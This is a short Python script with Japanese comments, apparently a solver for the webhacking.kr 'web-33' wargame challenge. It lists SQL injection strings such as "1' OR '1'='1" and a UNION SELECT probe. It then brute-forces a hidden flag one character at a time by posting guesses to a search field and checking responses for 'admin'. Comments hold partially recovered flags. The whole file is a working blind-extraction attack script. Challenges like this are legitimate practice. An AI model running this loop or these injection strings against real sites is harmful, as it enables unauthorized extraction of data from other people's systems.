import requests
import string

# URLの設定
url = "https://webhacking.kr/challenge/web-33/index.php"

# テストするペイロード（適宜調整してください）
payloads = [
    "test",
    "admin",
    "1' OR '1'='1",
    "%' UNION SELECT NULL--",
    "%"
]

strings = string.ascii_lowercase + string.ascii_uppercase + '!"#$&()*+,-./:;<=>?@[]^`{|}~' + string.digits + "_"


# セッションを利用する場合（Cookieなどが必要な場合に備えて）
session = requests.Session()

# ヘッダー（必要に応じて設定）
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
}

current_string = "flag{himiko"
#flag{himiko_t_g__is_cu_e_do_t_y_u_t_in__s_?}'
#flag{himiko_tO_a_is_cuT__doNT_yOU_tHIN__sO?}

# ペイロードをPOSTリクエストとして送信し、レスポンスを確認
while True:
    for char in strings:
        payload = current_string + char
        data = {"search": payload}  # POSTパラメータとして送信
        try:
            response = session.post(url, data=data, headers=headers)
            
            # レスポンスの本文をチェック
            if "admin" in response.text:
                current_string = payload
                print(f"Payload '{payload}' found 'admin' in response!")
                break

        except requests.exceptions.RequestException as e:
            print(f"An error occurred with payload '{payload}': {e}")
        
